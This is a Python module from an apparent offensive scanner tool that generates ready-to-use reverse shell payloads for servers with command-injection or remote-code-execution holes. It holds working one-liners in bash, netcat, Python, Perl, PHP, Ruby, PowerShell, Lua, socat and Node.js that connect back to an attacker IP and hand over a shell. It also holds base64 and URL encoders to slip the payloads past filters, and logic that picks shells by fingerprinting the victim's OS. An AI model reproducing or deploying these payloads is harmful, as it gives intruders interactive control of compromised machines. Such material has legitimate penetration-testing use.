"""
cyberm4fia-scanner - Reverse Shell Generator
Generates ready-to-use reverse shell payloads for confirmed RCE/CMDi vulnerabilities
"""

import socket
import base64
from urllib.parse import quote

from utils.colors import log_info, log_success
from utils.request import ScanExceptions

def get_local_ip():
    """Auto-detect local/public IP of the attacker's machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except ScanExceptions:
        return "ATTACKER_IP"

# ─────────────────────────────────────────────────────
# Shell Templates
# ─────────────────────────────────────────────────────
SHELLS = {
    "bash_tcp": {
        "name": "Bash TCP",
        "platform": "linux",
        "command": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    },
    "bash_udp": {
        "name": "Bash UDP",
        "platform": "linux",
        "command": "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    },
    "bash_pipe": {
        "name": "Bash Pipe (mkfifo)",
        "platform": "linux",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    "python3": {
        "name": "Python3",
        "platform": "cross",
        "command": (
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            's.connect(("{ip}",{port}));'
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            'subprocess.call(["/bin/sh","-i"])\''
        ),
    },
    "python2": {
        "name": "Python2",
        "platform": "cross",
        "command": (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            's.connect(("{ip}",{port}));'
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            'subprocess.call(["/bin/sh","-i"])\''
        ),
    },
    "perl": {
        "name": "Perl",
        "platform": "cross",
        "command": (
            "perl -e 'use Socket;"
            '$i="{ip}";$p={port};'
            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            "if(connect(S,sockaddr_in($p,inet_aton($i))))"
            '{{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            'exec("/bin/sh -i");}};\''
        ),
    },
    "php": {
        "name": "PHP",
        "platform": "cross",
        "command": (
            'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
        ),
    },
    "ruby": {
        "name": "Ruby",
        "platform": "cross",
        "command": (
            "ruby -rsocket -e'"
            'f=TCPSocket.open("{ip}",{port}).to_i;'
            'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        ),
    },
    "nc_traditional": {
        "name": "Netcat Traditional",
        "platform": "linux",
        "command": "nc -e /bin/sh {ip} {port}",
    },
    "nc_openbsd": {
        "name": "Netcat OpenBSD (no -e)",
        "platform": "linux",
        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    "powershell": {
        "name": "PowerShell",
        "platform": "windows",
        "command": (
            "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
            "{{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            '$client.Close()"'
        ),
    },
    "powershell_base64": {
        "name": "PowerShell Base64",
        "platform": "windows",
        "command": "ENCODED_POWERSHELL",  # Generated dynamically
    },
    "lua": {
        "name": "Lua",
        "platform": "cross",
        "command": (
            "lua -e \"require('socket');"
            "require('os');"
            "t=socket.tcp();"
            "t:connect('{ip}','{port}');"
            "os.execute('/bin/sh -i <&3 >&3 2>&3');\""
        ),
    },
    "socat": {
        "name": "Socat",
        "platform": "linux",
        "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    },
    "node": {
        "name": "Node.js",
        "platform": "cross",
        "command": (
            "node -e '(function(){{"
            'var net = require("net"),'
            'cp = require("child_process"),'
            'sh = cp.spawn("/bin/sh", []);'
            "var client = new net.Socket();"
            'client.connect({port}, "{ip}", function(){{'
            "client.pipe(sh.stdin);"
            "sh.stdout.pipe(client);"
            "sh.stderr.pipe(client);"
            "}});"
            "return /a/;}})();'"
        ),
    },
}

# ─────────────────────────────────────────────────────
# Encoding helpers
# ─────────────────────────────────────────────────────

def encode_base64(payload):
    """Base64 encode a payload."""
    return base64.b64encode(payload.encode()).decode()

def encode_url(payload):
    """URL encode a payload."""
    return quote(payload, safe="")

def generate_powershell_encoded(ip, port):
    """Generate base64-encoded PowerShell reverse shell."""
    ps_script = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
        "$client.Close()"
    )
    encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode()
    return f"powershell -e {encoded}"

def generate_shells(ip=None, port=4444, platform="all", encoding=None):
    """
    Generate all reverse shell payloads for given IP and port.
    platform: 'linux', 'windows', 'cross', or 'all'
    encoding: None, 'base64', or 'url'
    """
    if ip is None:
        ip = get_local_ip()

    results = []

    for key, shell in SHELLS.items():
        if platform != "all" and shell["platform"] not in (platform, "cross"):
            continue

        if key == "powershell_base64":
            command = generate_powershell_encoded(ip, port)
        else:
            command = shell["command"].format(ip=ip, port=port)

        # Apply encoding if requested
        if encoding == "base64":
            command = f"echo {encode_base64(command)} | base64 -d | bash"
        elif encoding == "url":
            command = encode_url(command)

        results.append(
            {
                "name": shell["name"],
                "platform": shell["platform"],
                "command": command,
                "key": key,
            }
        )

    return results

def auto_generate_for_vuln(vuln, ip=None, port=4444):
    """
    Auto-generate best reverse shell based on discovered vulnerability context.
    Takes a vulnerability dict from CMDi/RCE scanner and returns best-fit shells.
    """
    if ip is None:
        ip = get_local_ip()

    _ = []

    # Detect OS from vulnerability context
    _ = vuln.get("url", "").lower()
    _ = vuln.get("payload", "").lower()
    vuln_response = vuln.get("response", "").lower()

    is_windows = any(
        w in vuln_response
        for w in ["windows", "c:\\", "cmd.exe", "powershell", "system32"]
    )
    is_linux = any(
        w in vuln_response
        for w in ["/bin/sh", "/etc/passwd", "linux", "ubuntu", "debian", "root:x:"]
    )

    platform = "windows" if is_windows else "linux" if is_linux else "cross"

    # Generate shells for detected platform
    shells = generate_shells(ip=ip, port=port, platform=platform)

    # Prioritize based on reliability
    priority_order = {
        "linux": ["bash_pipe", "python3", "nc_openbsd", "perl", "socat", "node"],
        "windows": ["powershell", "powershell_base64", "python3", "node"],
        "cross": ["python3", "perl", "ruby", "php", "node", "lua"],
    }

    ordered_keys = priority_order.get(platform, priority_order["cross"])
    sorted_shells = sorted(
        shells,
        key=lambda s: ordered_keys.index(s["key"]) if s["key"] in ordered_keys else 99,
    )

    log_success(f"Generated {len(sorted_shells)} reverse shell(s) for {platform}")
    log_info(f"Listener command: nc -lvnp {port}")

    return sorted_shells

def print_shells(shells, max_display=5):
    """Pretty-print generated shells."""
    for i, shell in enumerate(shells[:max_display]):
        print(f"\n{'=' * 60}")
        print(f"  [{i + 1}] {shell['name']} ({shell['platform']})")
        print(f"{'=' * 60}")
        print(f"  {shell['command']}")
    print()
